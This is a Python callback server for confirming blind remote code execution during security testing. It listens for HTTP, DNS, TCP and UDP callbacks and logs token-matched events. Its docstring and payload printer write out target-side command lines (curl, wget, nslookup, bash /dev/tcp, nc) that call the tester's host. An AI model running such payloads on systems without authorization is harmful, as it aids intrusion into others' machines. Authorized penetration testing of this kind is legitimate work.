#!/usr/bin/env python3
"""
Multi-protocol callback server for verifying blind RCE.

Listens for HTTP, DNS, TCP, and UDP callbacks. Every event is printed and
appended to a JSONL log. A random token is generated so payloads and logs can
be correlated; token matching is case-insensitive. This is a listener, not an
exploit.

Examples:
    python3 callback_server.py
    python3 callback_server.py --http --tcp --udp --public-host 203.0.113.10
    sudo python3 callback_server.py --all
    sudo python3 callback_server.py --dns --dns-port 53
    python3 callback_server.py --all --once
    python3 callback_server.py --token mytoken --require-token

Payload examples (replace HOST with --public-host):
    HTTP:  curl -s http://HOST:8080/TOKEN
           wget -qO- http://HOST:8080/TOKEN
    DNS:   nslookup TOKEN.HOST HOST
    TCP:   bash -c 'echo TOKEN >/dev/tcp/HOST/9999'
           nc HOST 9999
    UDP:   echo TOKEN | nc -u HOST 9998

Only test devices you own or are authorized to test.
"""

import argparse
import json
import re
import secrets
import signal
import socket
import struct
import sys
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
STOP = threading.Event()
LOG_LOCK = threading.Lock()
ARGS = None
TOKEN = ""
LOG_HANDLE = None

DNS_TYPES = {
    1: "A",
    2: "NS",
    5: "CNAME",
    6: "SOA",
    12: "PTR",
    15: "MX",
    16: "TXT",
    28: "AAAA",
    33: "SRV",
    255: "ANY",
}
SENSITIVE_HEADERS = {
    "authorization", "cookie", "proxy-authorization", "x-api-key",
    "x-auth-token", "set-cookie",
}


def now():
    return datetime.now().astimezone().isoformat(timespec="seconds")


def has_token(value):
    if not TOKEN:
        return False
    if isinstance(value, bytes):
        value = value.decode("utf-8", "replace")
    return TOKEN.lower() in str(value).lower()


def redact_headers(headers):
    return {
        key: ("<redacted>" if key.lower() in SENSITIVE_HEADERS else value)
        for key, value in headers.items()
    }


def log_event(protocol, addr, token_match, summary, **fields):
    if ARGS.require_token and not token_match:
        return

    event = {
        "ts": now(),
        "protocol": protocol,
        "source_ip": addr[0],
        "source_port": addr[1],
        "token_match": bool(token_match),
        "token": TOKEN,
        "summary": summary,
    }
    event.update(fields)

    flag = "token" if token_match else "no-token"
    with LOG_LOCK:
        print("[%s] %s %s:%s %s %s" % (
            protocol.upper(), event["ts"], addr[0], addr[1], flag, summary
        ))
        if protocol == "http":
            body = fields.get("body", "")
            if body:
                print("    body: %s" % body[:300].replace("\n", "\\n"))
        elif protocol in ("tcp", "udp"):
            data = fields.get("data", "")
            if data:
                print("    data: %s" % data[:300].replace("\n", "\\n"))
        elif protocol == "dns":
            print("    qname: %s (%s)" % (
                fields.get("qname", "?"),
                fields.get("qtype_name", "?"),
            ))

        if LOG_HANDLE is not None and not LOG_HANDLE.closed:
            try:
                LOG_HANDLE.write(json.dumps(event, ensure_ascii=False) + "\n")
            except (OSError, ValueError):
                pass

    if ARGS.once:
        STOP.set()


def parse_dns_name(data, offset):
    labels = []
    seen = set()
    pos = offset
    while pos < len(data):
        length = data[pos]
        if length == 0:
            pos += 1
            break
        if length & 0xC0 == 0xC0:
            if pos + 1 >= len(data):
                break
            pointer = ((length & 0x3F) << 8) | data[pos + 1]
            if pointer in seen:
                break
            seen.add(pointer)
            sub, _ = parse_dns_name(data, pointer)
            if sub:
                labels.append(sub)
            pos += 2
            break
        if length > 63 or pos + 1 + length > len(data):
            break
        labels.append(data[pos + 1:pos + 1 + length].decode("utf-8", "replace"))
        pos += 1 + length
    return ".".join(labels), pos


def build_dns_response(query, q_end, qtype, answer_ip):
    question = query[12:q_end + 4]
    if qtype == 1:
        try:
            packed = socket.inet_aton(answer_ip)
        except OSError:
            packed = socket.inet_aton("127.0.0.1")
        answer = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + packed
        answer_count = 1
    else:
        answer = b""
        answer_count = 0
    header = query[:2] + b"\x81\x80" + struct.pack(
        "!HHHH", 1, answer_count, 0, 0
    )
    return header + question + answer


def handle_dns(data, addr, sock):
    if len(data) < 12:
        log_event("dns", addr, has_token(data), "short query",
                  raw_hex=data.hex()[:2048])
        return

    _txid, _flags, qdcount, _ancount, _nscount, _arcount = struct.unpack(
        "!HHHHHH", data[:12]
    )
    qname = ""
    qtype = 0

    try:
        if qdcount < 1:
            raise ValueError("no question")
        qname, q_end = parse_dns_name(data, 12)
        qtype, _qclass = struct.unpack("!HH", data[q_end:q_end + 4])
        qtype_name = DNS_TYPES.get(qtype, str(qtype))
        sock.sendto(build_dns_response(data, q_end, qtype, ARGS.dns_answer), addr)
        log_event(
            "dns",
            addr,
            has_token(qname) or has_token(data),
            "%s %s" % (qname or "?", qtype_name),
            qname=qname,
            qtype=qtype,
            qtype_name=qtype_name,
            raw_hex=data.hex()[:2048],
        )
    except Exception as exc:
        if len(data) >= 2:
            sock.sendto(data[:2] + b"\x81\x82" + b"\x00\x00" * 4, addr)
        log_event(
            "dns",
            addr,
            has_token(data),
            "parse error: %s" % exc,
            raw_hex=data.hex()[:2048],
        )


def serve_dns():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((ARGS.bind, ARGS.dns_port))
    except OSError as exc:
        print("[!] DNS bind failed on %s:%d: %s" % (ARGS.bind, ARGS.dns_port, exc))
        return
    sock.settimeout(1.0)
    print("[DNS] Listening on %s:%d (answer %s)" % (
        ARGS.bind, ARGS.dns_port, ARGS.dns_answer
    ))
    while not STOP.is_set():
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            handle_dns(data, addr, sock)
        except Exception as exc:
            print("[!] DNS handler error: %s" % exc)
    sock.close()


class CallbackHandler(BaseHTTPRequestHandler):
    server_version = "CallbackServer/1.0"
    sys_version = ""

    def _handle(self):
        try:
            length = int(self.headers.get("Content-Length", "0") or 0)
        except ValueError:
            length = 0
        length = max(0, min(length, 1024 * 1024))
        body = self.rfile.read(length) if length else b""
        headers = {key: value for key, value in self.headers.items()}
        body_text = body.decode("utf-8", "replace")
        blob = self.path + "\n" + json.dumps(headers) + "\n" + body_text
        forwarded_for = (
            headers.get("X-Forwarded-For")
            or headers.get("X-Real-IP")
            or headers.get("Forwarded")
            or ""
        )

        payload = ("callback received token=%s\n" % TOKEN).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(payload)

        extra = {
            "method": self.command,
            "path": self.path,
            "headers": redact_headers(headers),
            "body": body_text[:8192],
        }
        if forwarded_for:
            extra["forwarded_for"] = forwarded_for
        log_event(
            "http",
            self.client_address,
            has_token(blob),
            "%s %s" % (self.command, self.path),
            **extra,
        )

    do_GET = _handle
    do_POST = _handle
    do_PUT = _handle
    do_DELETE = _handle
    do_PATCH = _handle
    do_OPTIONS = _handle
    do_HEAD = _handle
    do_TRACE = _handle

    def log_message(self, _format, *args):
        pass


def serve_http():
    try:
        server = ThreadingHTTPServer((ARGS.bind, ARGS.http_port), CallbackHandler)
    except OSError as exc:
        print("[!] HTTP bind failed on %s:%d: %s" % (
            ARGS.bind, ARGS.http_port, exc
        ))
        return
    server.daemon_threads = True
    print("[HTTP] Listening on %s:%d" % (ARGS.bind, ARGS.http_port))
    server.serve_forever(poll_interval=0.2)


def handle_tcp_client(client, addr):
    log_event("tcp", addr, False, "connect", event="connect")
    data = bytearray()
    client.settimeout(ARGS.tcp_read_timeout)
    try:
        while len(data) < 8192:
            chunk = client.recv(4096)
            if not chunk:
                break
            data.extend(chunk)
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    except OSError:
        pass

    if ARGS.tcp_banner:
        try:
            client.sendall(ARGS.tcp_banner.encode())
        except OSError:
            pass
    if data:
        text = bytes(data).decode("utf-8", "replace")
        log_event(
            "tcp",
            addr,
            has_token(data),
            "data %d bytes" % len(data),
            event="data",
            data=text[:8192],
            data_hex=bytes(data).hex()[:4096],
        )
    client.close()


def serve_tcp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((ARGS.bind, ARGS.tcp_port))
        sock.listen(50)
    except OSError as exc:
        print("[!] TCP bind failed on %s:%d: %s" % (
            ARGS.bind, ARGS.tcp_port, exc
        ))
        return
    sock.settimeout(1.0)
    print("[TCP] Listening on %s:%d" % (ARGS.bind, ARGS.tcp_port))
    while not STOP.is_set():
        try:
            client, addr = sock.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        threading.Thread(
            target=handle_tcp_client, args=(client, addr), daemon=True
        ).start()
    sock.close()


def serve_udp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((ARGS.bind, ARGS.udp_port))
    except OSError as exc:
        print("[!] UDP bind failed on %s:%d: %s" % (
            ARGS.bind, ARGS.udp_port, exc
        ))
        return
    sock.settimeout(1.0)
    print("[UDP] Listening on %s:%d" % (ARGS.bind, ARGS.udp_port))
    while not STOP.is_set():
        try:
            data, addr = sock.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            break
        text = data.decode("utf-8", "replace")
        if ARGS.udp_reply:
            try:
                sock.sendto(ARGS.udp_reply.encode(), addr)
            except OSError:
                pass
        log_event(
            "udp",
            addr,
            has_token(data),
            "%d bytes" % len(data),
            event="data",
            data=text[:8192],
            data_hex=data.hex()[:4096],
        )
    sock.close()


def detect_public_host():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


def print_payloads(args, host):
    print("\nPayload examples:")
    if args.http:
        print("  HTTP:  curl -s http://%s:%d/%s" % (host, args.http_port, TOKEN))
        print("         wget -qO- http://%s:%d/%s" % (host, args.http_port, TOKEN))
    if args.dns:
        print("  DNS:   nslookup %s.%s %s" % (TOKEN, host, host))
        print("         nslookup %s %s" % (TOKEN, host))
    if args.tcp:
        print("  TCP:   bash -c 'echo %s >/dev/tcp/%s/%d'" % (
            TOKEN, host, args.tcp_port
        ))
        print("         nc %s %d" % (host, args.tcp_port))
    if args.udp:
        print("  UDP:   echo %s | nc -u %s %d" % (
            TOKEN, host, args.udp_port
        ))


def main():
    global ARGS, TOKEN, LOG_HANDLE

    parser = argparse.ArgumentParser(
        description="Multi-protocol callback server for blind RCE verification"
    )
    parser.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    parser.add_argument("--public-host", help="Host/IP printed in payload examples")
    parser.add_argument("--token", help="Callback token (default: random)")
    parser.add_argument(
        "--require-token", action="store_true",
        help="Only log callbacks containing the token",
    )
    parser.add_argument(
        "--once", action="store_true",
        help="Exit after the first logged callback",
    )
    parser.add_argument("--no-log", action="store_true", help="Disable JSONL logging")
    parser.add_argument(
        "--log-dir", default=str(BASE_DIR / "data"),
        help="Directory for JSONL logs (default: data/)",
    )
    parser.add_argument("--http", action="store_true", help="Enable HTTP")
    parser.add_argument("--tcp", action="store_true", help="Enable TCP")
    parser.add_argument("--udp", action="store_true", help="Enable UDP")
    parser.add_argument("--dns", action="store_true", help="Enable DNS (UDP)")
    parser.add_argument("--all", action="store_true", help="Enable all protocols")
    parser.add_argument("--http-port", type=int, default=8080)
    parser.add_argument("--tcp-port", type=int, default=9999)
    parser.add_argument("--udp-port", type=int, default=9998)
    parser.add_argument("--dns-port", type=int, default=53)
    parser.add_argument(
        "--dns-answer", default="127.0.0.1",
        help="A-record answer for DNS callbacks (default: 127.0.0.1)",
    )
    parser.add_argument("--tcp-banner", default="OK\n", help="Bytes sent on TCP connect")
    parser.add_argument("--udp-reply", default="OK\n", help="Bytes sent on UDP packet")
    parser.add_argument(
        "--tcp-read-timeout", type=float, default=3.0,
        help="Seconds to wait for TCP data (default: 3)",
    )
    args = parser.parse_args()
    ARGS = args

    for name in ("http_port", "tcp_port", "udp_port", "dns_port"):
        value = getattr(args, name)
        if not 1 <= value <= 65535:
            parser.error("--%s must be between 1 and 65535" % name.replace("_", "-"))
    if args.tcp_read_timeout <= 0:
        parser.error("--tcp-read-timeout must be positive")

    if not (args.http or args.tcp or args.udp or args.dns or args.all):
        args.http = True
    if args.all:
        args.http = args.tcp = args.udp = args.dns = True

    TOKEN = args.token or secrets.token_hex(6)
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", TOKEN):
        parser.error("--token may contain only letters, digits, dot, dash and underscore")
    public_host = args.public_host or detect_public_host()

    if not args.no_log:
        log_dir = Path(args.log_dir)
        log_dir.mkdir(parents=True, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_path = log_dir / ("callbacks_%s.jsonl" % stamp)
        LOG_HANDLE = open(log_path, "a", encoding="utf-8", buffering=1)

    signal.signal(signal.SIGINT, lambda *_: STOP.set())
    signal.signal(signal.SIGTERM, lambda *_: STOP.set())

    print("=== Callback Server ===")
    print("Token:       %s" % TOKEN)
    print("Bind:        %s" % args.bind)
    print("Public host: %s" % public_host)
    if LOG_HANDLE is not None:
        print("Log:         %s" % log_path)
    print("Protocols:   %s" % ", ".join(
        "%s:%d" % (name.upper(), port)
        for name, enabled, port in [
            ("http", args.http, args.http_port),
            ("dns", args.dns, args.dns_port),
            ("tcp", args.tcp, args.tcp_port),
            ("udp", args.udp, args.udp_port),
        ]
        if enabled
    ))

    workers = []
    if args.http:
        workers.append(threading.Thread(target=serve_http, daemon=True))
    if args.dns:
        workers.append(threading.Thread(target=serve_dns, daemon=True))
    if args.tcp:
        workers.append(threading.Thread(target=serve_tcp, daemon=True))
    if args.udp:
        workers.append(threading.Thread(target=serve_udp, daemon=True))

    for worker in workers:
        worker.start()

    print_payloads(args, public_host)
    print("\nWaiting for callbacks...\n")

    try:
        while not STOP.wait(0.5):
            pass
    except KeyboardInterrupt:
        STOP.set()

    print("\nShutting down...")
    time.sleep(0.5)
    if LOG_HANDLE is not None:
        with LOG_LOCK:
            try:
                LOG_HANDLE.flush()
                LOG_HANDLE.close()
            except (OSError, ValueError):
                pass


if __name__ == "__main__":
    main()
